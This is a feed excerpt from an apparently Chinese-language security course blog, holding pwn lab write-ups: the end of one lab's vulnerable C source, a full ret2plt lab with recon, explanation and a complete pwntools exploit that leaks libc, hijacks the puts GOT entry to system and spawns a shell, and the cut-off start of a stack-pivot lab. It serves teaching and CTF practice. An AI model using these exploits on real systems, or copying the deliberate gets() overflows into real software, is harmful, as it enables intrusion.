&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">#include&lt;/span> &lt;span style="color:#75715e">&amp;lt;string.h&amp;gt;&lt;/span>&lt;span style="color:#75715e">
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">#include&lt;/span> &lt;span style="color:#75715e">&amp;lt;unistd.h&amp;gt;&lt;/span>&lt;span style="color:#75715e">
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">#include&lt;/span> &lt;span style="color:#75715e">&amp;lt;sys/types.h&amp;gt;&lt;/span>&lt;span style="color:#75715e">
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">#include&lt;/span> &lt;span style="color:#75715e">&amp;lt;fcntl.h&amp;gt;&lt;/span>&lt;span style="color:#75715e">
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#66d9ef">char&lt;/span> flag[&lt;span style="color:#ae81ff">0x10&lt;/span>];
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#66d9ef">long&lt;/span> secret;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#66d9ef">char&lt;/span> empty_buf[&lt;span style="color:#ae81ff">0x30&lt;/span>];
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#66d9ef">void&lt;/span> &lt;span style="color:#a6e22e">check&lt;/span>(&lt;span style="color:#66d9ef">char&lt;/span> &lt;span style="color:#f92672">*&lt;/span>input)
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>{
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>	&lt;span style="color:#66d9ef">char&lt;/span> pass[&lt;span style="color:#ae81ff">0x10&lt;/span>];
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>	&lt;span style="color:#66d9ef">char&lt;/span> output[&lt;span style="color:#ae81ff">0x10&lt;/span>];
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>	&lt;span style="color:#66d9ef">for&lt;/span> (&lt;span style="color:#66d9ef">int&lt;/span> i &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#ae81ff">0&lt;/span>; i &lt;span style="color:#f92672">&amp;lt;&lt;/span> &lt;span style="color:#ae81ff">2&lt;/span>; &lt;span style="color:#f92672">++&lt;/span>i)
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>	{
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>		((&lt;span style="color:#66d9ef">long&lt;/span> &lt;span style="color:#f92672">*&lt;/span>)pass)[i] &lt;span style="color:#f92672">=&lt;/span> ((&lt;span style="color:#66d9ef">long&lt;/span> &lt;span style="color:#f92672">*&lt;/span>)input)[i] &lt;span style="color:#f92672">^&lt;/span> secret;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>	}
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>	&lt;span style="color:#66d9ef">if&lt;/span> (strcmp(pass, &lt;span style="color:#e6db74">&amp;#34;kyoumokawaii&amp;#34;&lt;/span>) &lt;span style="color:#f92672">==&lt;/span> &lt;span style="color:#ae81ff">0&lt;/span>)
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>	{
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>		&lt;span style="color:#66d9ef">for&lt;/span> (&lt;span style="color:#66d9ef">int&lt;/span> i &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#ae81ff">0&lt;/span>; i &lt;span style="color:#f92672">&amp;lt;&lt;/span> &lt;span style="color:#ae81ff">2&lt;/span>; &lt;span style="color:#f92672">++&lt;/span>i)
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>			((&lt;span style="color:#66d9ef">long&lt;/span> &lt;span style="color:#f92672">*&lt;/span>)output)[i] &lt;span style="color:#f92672">=&lt;/span> ((&lt;span style="color:#66d9ef">long&lt;/span> &lt;span style="color:#f92672">*&lt;/span>)flag)[i] &lt;span style="color:#f92672">^&lt;/span> ((&lt;span style="color:#66d9ef">long&lt;/span> &lt;span style="color:#f92672">*&lt;/span>)pass)[i];
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>	}
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>	printf(&lt;span style="color:#e6db74">&amp;#34;flag = %s&lt;/span>&lt;span style="color:#ae81ff">\n&lt;/span>&lt;span style="color:#e6db74">&amp;#34;&lt;/span>, output);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>}
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#66d9ef">int&lt;/span> &lt;span style="color:#a6e22e">main&lt;/span>(&lt;span style="color:#66d9ef">void&lt;/span>)
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>{
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>	setvbuf(stdin, &lt;span style="color:#ae81ff">0&lt;/span>, _IONBF, &lt;span style="color:#ae81ff">0&lt;/span>);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>	setvbuf(stdout, &lt;span style="color:#ae81ff">0&lt;/span>, _IONBF, &lt;span style="color:#ae81ff">0&lt;/span>);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>	&lt;span style="color:#66d9ef">int&lt;/span> fd &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#ae81ff">0&lt;/span>;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>	&lt;span style="color:#66d9ef">char&lt;/span> buf[&lt;span style="color:#ae81ff">0x10&lt;/span>];
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>	fd &lt;span style="color:#f92672">=&lt;/span> open(&lt;span style="color:#e6db74">&amp;#34;/home/chal/flag.txt&amp;#34;&lt;/span>, O_RDONLY);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>	read(fd, flag, &lt;span style="color:#ae81ff">0x10&lt;/span>);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>	close(fd);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>	fd &lt;span style="color:#f92672">=&lt;/span> open(&lt;span style="color:#e6db74">&amp;#34;/dev/urandom&amp;#34;&lt;/span>, O_RDONLY);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>	read(fd, &lt;span style="color:#f92672">&amp;amp;&lt;/span>secret, &lt;span style="color:#66d9ef">sizeof&lt;/span>(secret));
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>	&lt;span style="color:#66d9ef">for&lt;/span> (&lt;span style="color:#66d9ef">int&lt;/span> i &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#ae81ff">0&lt;/span>; i &lt;span style="color:#f92672">&amp;lt;&lt;/span> &lt;span style="color:#ae81ff">2&lt;/span>; &lt;span style="color:#f92672">++&lt;/span>i)
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>		((&lt;span style="color:#66d9ef">long&lt;/span> &lt;span style="color:#f92672">*&lt;/span>)flag)[i] &lt;span style="color:#f92672">=&lt;/span> ((&lt;span style="color:#66d9ef">long&lt;/span> &lt;span style="color:#f92672">*&lt;/span>)flag)[i] &lt;span style="color:#f92672">^&lt;/span> secret;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>	printf(&lt;span style="color:#e6db74">&amp;#34;secret = %lx&lt;/span>&lt;span style="color:#ae81ff">\n&lt;/span>&lt;span style="color:#e6db74">&amp;#34;&lt;/span>, secret);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>	printf(&lt;span style="color:#e6db74">&amp;#34;&amp;gt; &amp;#34;&lt;/span>);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>	gets(buf);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>	&lt;span style="color:#66d9ef">return&lt;/span> &lt;span style="color:#ae81ff">0&lt;/span>;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>}
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>:::&lt;/p></description></item><item><title>Simple PWN 0x34 (2023 Lab - ret2plt)</title><link>https://bernie6401.github.io/docs/security/course/ntu-cs/pwn/simple-pwn-0x34-2023-lab---ret2plt/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/docs/security/course/ntu-cs/pwn/simple-pwn-0x34-2023-lab---ret2plt/</guid><description>&lt;h1 id="simple-pwn-0x34-2023-lab---ret2plt">
 Simple PWN 0x34 (2023 Lab - ret2plt)
 &lt;a class="anchor" href="#simple-pwn-0x34-2023-lab---ret2plt">#&lt;/a>
&lt;/h1>
&lt;h2 id="background">
 Background
 &lt;a class="anchor" href="#background">#&lt;/a>
&lt;/h2>
&lt;p>Got Hijack / BoF&lt;/p>
&lt;h2 id="source-code">
 Source code
 &lt;a class="anchor" href="#source-code">#&lt;/a>
&lt;/h2>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-cpp" data-lang="cpp">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">//gcc -no-pie -fno-stack-protector -z norelro ret2plt.c -o ret2plt
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span>&lt;span style="color:#75715e">#include&lt;/span> &lt;span style="color:#75715e">&amp;lt;stdio.h&amp;gt;&lt;/span>&lt;span style="color:#75715e">
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">#include&lt;/span> &lt;span style="color:#75715e">&amp;lt;stdlib.h&amp;gt;&lt;/span>&lt;span style="color:#75715e">
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#66d9ef">int&lt;/span> &lt;span style="color:#a6e22e">main&lt;/span>(){
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>	&lt;span style="color:#66d9ef">char&lt;/span> buf[&lt;span style="color:#ae81ff">20&lt;/span>];
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>	setvbuf(stdout,&lt;span style="color:#ae81ff">0&lt;/span>,&lt;span style="color:#ae81ff">2&lt;/span>,&lt;span style="color:#ae81ff">0&lt;/span>);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>	printf(&lt;span style="color:#e6db74">&amp;#34;Try your best :&amp;#34;&lt;/span>);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>	gets(buf);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>	puts(&lt;span style="color:#e6db74">&amp;#34;boom !&amp;#34;&lt;/span>);	
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>}
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;h2 id="recon">
 Recon
 &lt;a class="anchor" href="#recon">#&lt;/a>
&lt;/h2>
&lt;ol>
&lt;li>checksec + file
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-bash" data-lang="bash">&lt;span style="display:flex;">&lt;span>$ checksec chal
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">[&lt;/span>*&lt;span style="color:#f92672">]&lt;/span> &lt;span style="color:#e6db74">&amp;#39;/mnt/d/NTU/Second Year/Computer Security/PWN/Lab2/lab_ret2plt/share/chal&amp;#39;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> Arch: amd64-64-little
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> RELRO: No RELRO
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> Stack: No canary found
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> NX: NX enabled
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> PIE: No PIE &lt;span style="color:#f92672">(&lt;/span>0x400000&lt;span style="color:#f92672">)&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>$ file chal
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>chal: ELF 64-bit LSB executable, x86-64, version &lt;span style="color:#ae81ff">1&lt;/span> &lt;span style="color:#f92672">(&lt;/span>SYSV&lt;span style="color:#f92672">)&lt;/span>, dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, BuildID&lt;span style="color:#f92672">[&lt;/span>sha1&lt;span style="color:#f92672">]=&lt;/span>f7ed984819a3908eff455bfcf87716d0fb298fac, &lt;span style="color:#66d9ef">for&lt;/span> GNU/Linux 3.2.0, not stripped
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>首先知道這隻binary是動態link library，所以可想而知，rop gadget一定少的可憐，所以我們不太能夠直接像上一題一樣暴力開一個shell出來，程式也沒有幫我們開，讓我們可以直接跳過去&lt;/li>
&lt;li>還是有很明顯的BOF的漏洞，此時就可以嘗試類似got hijack的方式打看看
流程:&lt;/li>
&lt;li>首先我們要知道libc base address才能夠利用扣掉offset的方式跳到system的地方，但是程式中並沒有能夠直接leak base address給我們的東西，因此我們可以自己想辦法leak: ==ret2plt==
&lt;pre tabindex="0">&lt;code>pop rdi ret
puts got address
puts plt
&lt;/code>&lt;/pre>這三行的意思是把puts的got address，透過puts印出來給我們 -&amp;gt; puts(put自己的got address)&lt;/li>
&lt;li>有了puts的got address之後，就可以扣掉puts在libc的offset，就可以知道base address，然後我們可以知道system的確切address
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-python" data-lang="python">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e"># leak puts got address to calculate libc base address&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>puts_addr &lt;span style="color:#f92672">=&lt;/span> u64(r&lt;span style="color:#f92672">.&lt;/span>recv(&lt;span style="color:#ae81ff">6&lt;/span>)&lt;span style="color:#f92672">.&lt;/span>ljust(&lt;span style="color:#ae81ff">8&lt;/span>, &lt;span style="color:#e6db74">b&lt;/span>&lt;span style="color:#e6db74">&amp;#39;&lt;/span>&lt;span style="color:#ae81ff">\x00&lt;/span>&lt;span style="color:#e6db74">&amp;#39;&lt;/span>))
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>libc_base &lt;span style="color:#f92672">=&lt;/span> puts_addr &lt;span style="color:#f92672">-&lt;/span> libc&lt;span style="color:#f92672">.&lt;/span>symbols[&lt;span style="color:#e6db74">&amp;#39;puts&amp;#39;&lt;/span>]
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>libc&lt;span style="color:#f92672">.&lt;/span>address &lt;span style="color:#f92672">=&lt;/span> libc_base
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>system_addr &lt;span style="color:#f92672">=&lt;/span> libc&lt;span style="color:#f92672">.&lt;/span>symbols[&lt;span style="color:#e6db74">&amp;#39;system&amp;#39;&lt;/span>]
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;/li>
&lt;li>現在的問題有兩個，一個是我們要怎麼把==/bin/sh==送進去，因為如果直接看binary的gadget沒有&lt;code>/bin/sh&lt;/code>或是&lt;code>/sh&lt;/code>的string，不過我們可以直接用同樣的方法，把字串送進去
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-python" data-lang="python">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e"># fetch user input -&amp;gt; /bin/sh\x00&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>pop_rdi_ret
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>bss_addr
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>gets_plt,
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>此時他就會像使用者要輸入，並把我們的輸入丟到bss address&lt;/li>
&lt;li>另外一個問題就是我們要怎麼呼叫==system==，因為這個binary是動態的，代表一開始沒有link到system的話就不能直接呼叫，因此我們可以利用同樣的方法達到==got hijacking==
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-python" data-lang="python">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e"># fetch user input -&amp;gt; system address&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>pop_rdi_ret
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>puts_got
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>gets_plt
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>此時我們可以輸入system的address，經過這三行後我們就成功把puts got address換成system got address&lt;/li>
&lt;li>所有工具都準備好了，接下來只要呼叫puts就可以了，實際上就是呼叫system
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-python" data-lang="python">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e"># system(&amp;#39;/bin/sh\x00&amp;#39;)&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>pop_rdi_ret
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>bss_addr
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>puts_plt
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;/li>
&lt;/ol>
&lt;h2 id="exploit---ret2pltleak-base-address--got-hijackcall-system">
 Exploit - Ret2Plt(leak base address) + Got Hijack(call system)
 &lt;a class="anchor" href="#exploit---ret2pltleak-base-address--got-hijackcall-system">#&lt;/a>
&lt;/h2>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-python" data-lang="python">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">from&lt;/span> pwn &lt;span style="color:#f92672">import&lt;/span> &lt;span style="color:#f92672">*&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>r &lt;span style="color:#f92672">=&lt;/span> process(&lt;span style="color:#e6db74">&amp;#39;./chal&amp;#39;&lt;/span>)
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e"># r = remote(&amp;#39;10.113.184.121&amp;#39;, 10053)&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>libc &lt;span style="color:#f92672">=&lt;/span> ELF(&lt;span style="color:#e6db74">&amp;#39;/lib/x86_64-linux-gnu/libc.so.6&amp;#39;&lt;/span>)
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>context&lt;span style="color:#f92672">.&lt;/span>arch &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#e6db74">&amp;#39;amd64&amp;#39;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>pop_rdi_ret &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#ae81ff">0x0000000000401263&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>puts_got &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#ae81ff">0x403368&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>puts_plt &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#ae81ff">0x401070&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>gets_got &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#ae81ff">0x403378&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>gets_plt &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#ae81ff">0x401090&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>bss_addr &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#ae81ff">0x403f00&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>payload &lt;span style="color:#f92672">=&lt;/span> flat(
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75715e"># leak puts got address to calculate libc base address&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> pop_rdi_ret, puts_got,
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> puts_plt,
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75715e"># fetch user input -&amp;gt; /bin/sh\x00&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> pop_rdi_ret, bss_addr,
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> gets_plt,
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75715e"># fetch user input -&amp;gt; system address&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> pop_rdi_ret, puts_got,
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> gets_plt,
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75715e"># system(&amp;#39;/bin/sh\x00&amp;#39;)&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> pop_rdi_ret, bss_addr,
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> puts_plt
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>)
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>raw_input()
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>r&lt;span style="color:#f92672">.&lt;/span>sendlineafter(&lt;span style="color:#e6db74">b&lt;/span>&lt;span style="color:#e6db74">&amp;#39;Try your best :&amp;#39;&lt;/span>, &lt;span style="color:#e6db74">b&lt;/span>&lt;span style="color:#e6db74">&amp;#39;a&amp;#39;&lt;/span> &lt;span style="color:#f92672">*&lt;/span> &lt;span style="color:#ae81ff">0x28&lt;/span> &lt;span style="color:#f92672">+&lt;/span> payload)
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>print(r&lt;span style="color:#f92672">.&lt;/span>recvline())
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>puts_addr &lt;span style="color:#f92672">=&lt;/span> u64(r&lt;span style="color:#f92672">.&lt;/span>recv(&lt;span style="color:#ae81ff">6&lt;/span>)&lt;span style="color:#f92672">.&lt;/span>ljust(&lt;span style="color:#ae81ff">8&lt;/span>, &lt;span style="color:#e6db74">b&lt;/span>&lt;span style="color:#e6db74">&amp;#39;&lt;/span>&lt;span style="color:#ae81ff">\x00&lt;/span>&lt;span style="color:#e6db74">&amp;#39;&lt;/span>))
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>log&lt;span style="color:#f92672">.&lt;/span>info(&lt;span style="color:#e6db74">f&lt;/span>&lt;span style="color:#e6db74">&amp;#34;puts address = &lt;/span>&lt;span style="color:#e6db74">{&lt;/span>hex(puts_addr)&lt;span style="color:#e6db74">}&lt;/span>&lt;span style="color:#e6db74">&amp;#34;&lt;/span>)
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>libc_base &lt;span style="color:#f92672">=&lt;/span> puts_addr &lt;span style="color:#f92672">-&lt;/span> libc&lt;span style="color:#f92672">.&lt;/span>symbols[&lt;span style="color:#e6db74">&amp;#39;puts&amp;#39;&lt;/span>]
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>libc&lt;span style="color:#f92672">.&lt;/span>address &lt;span style="color:#f92672">=&lt;/span> libc_base
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>system_addr &lt;span style="color:#f92672">=&lt;/span> libc&lt;span style="color:#f92672">.&lt;/span>symbols[&lt;span style="color:#e6db74">&amp;#39;system&amp;#39;&lt;/span>]
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>log&lt;span style="color:#f92672">.&lt;/span>info(&lt;span style="color:#e6db74">f&lt;/span>&lt;span style="color:#e6db74">&amp;#39;system address = &lt;/span>&lt;span style="color:#e6db74">{&lt;/span>hex(system_addr)&lt;span style="color:#e6db74">}&lt;/span>&lt;span style="color:#e6db74">&amp;#39;&lt;/span>)
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>r&lt;span style="color:#f92672">.&lt;/span>sendline(&lt;span style="color:#e6db74">b&lt;/span>&lt;span style="color:#e6db74">&amp;#39;/bin/sh&lt;/span>&lt;span style="color:#ae81ff">\x00&lt;/span>&lt;span style="color:#e6db74">&amp;#39;&lt;/span>)
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>raw_input()
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>r&lt;span style="color:#f92672">.&lt;/span>sendline(p64(libc&lt;span style="color:#f92672">.&lt;/span>symbols[&lt;span style="color:#e6db74">&amp;#39;system&amp;#39;&lt;/span>]))
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>r&lt;span style="color:#f92672">.&lt;/span>interactive()
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div></description></item><item><title>Simple PWN 0x35(2023 Lab - Stack Pivot)</title><link>https://bernie6401.github.io/docs/security/course/ntu-cs/pwn/simple-pwn-0x352023-lab---stack-pivot/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/docs/security/course/ntu-cs/pwn/simple-pwn-0x352023-lab---stack-pivot/</guid><description>&lt;h1 id="simple-pwn-0x352023-lab---stack-pivot">
 Simple PWN 0x35(2023 Lab - Stack Pivot)
 &lt;a class="anchor" href="#simple-pwn-0x352023-lab---stack-pivot">#&lt;/a>
&lt;/h1>
&lt;h2 id="background">
 Background
 &lt;a class="anchor" href="#background">#&lt;/a>
&lt;/h2>
&lt;p>&lt;a href="https://hackmd.io/@SBK6401/rylybxgji">Simple PWN - 0x09(stack pivoting)&lt;/a>
&lt;a href="https://hackmd.io/@SBK6401/H1NX6Bloj">Simple PWN - 0x10(seccomp/Lab - rop2win)&lt;/a>&lt;/p>
&lt;h2 id="source-code">
 Source code
 &lt;a class="anchor" href="#source-code">#&lt;/a>
&lt;/h2>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-cpp" data-lang="cpp">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">#include&lt;/span> &lt;span style="color:#75715e">&amp;lt;stdio.h&amp;gt;&lt;/span>&lt;span style="color:#75715e">
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">#include&lt;/span> &lt;span style="color:#75715e">&amp;lt;unistd.h&amp;gt;&lt;/span>&lt;span style="color:#75715e">
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#66d9ef">int&lt;/span> &lt;span style="color:#a6e22e">main&lt;/span>(&lt;span style="color:#66d9ef">void&lt;/span>)
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>{
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>	&lt;span style="color:#66d9ef">char&lt;/span> buf[&lt;span style="color:#ae81ff">0x20&lt;/span>];
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>	read(&lt;span style="color:#ae81ff">0&lt;/span>, buf, &lt;span style="color:#ae81ff">0x80&lt;/span>);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>	&lt;span style="color:#66d9ef">return&lt;/span> &lt;span style="color:#ae81ff">0&lt;/span>;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>}
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;h2 id="recon">
 Recon
 &lt;a class="anchor" href="#recon">#&lt;/a>
&lt;/h2>
